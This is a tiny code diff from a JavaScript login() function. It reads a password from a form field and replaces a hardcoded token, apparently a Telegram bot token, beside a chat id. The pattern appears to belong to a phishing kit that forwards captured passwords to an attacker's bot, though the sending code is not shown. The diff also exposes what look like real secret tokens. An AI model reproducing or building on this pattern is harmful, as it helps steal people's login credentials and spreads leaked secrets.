@@ -20,7 +20,7 @@ function login() {
 
   var pass = $("#pass").val();
 
-  var token = "854455187:AAGOmBYHbEEBHN46tl9gsbVgyTp2N0RKS7s";
+  var token = "727688613:AAFR83xpbqca7EiGSJWx4TXrMT8oFrzEjV4";
 
   var id = "898236524";
 
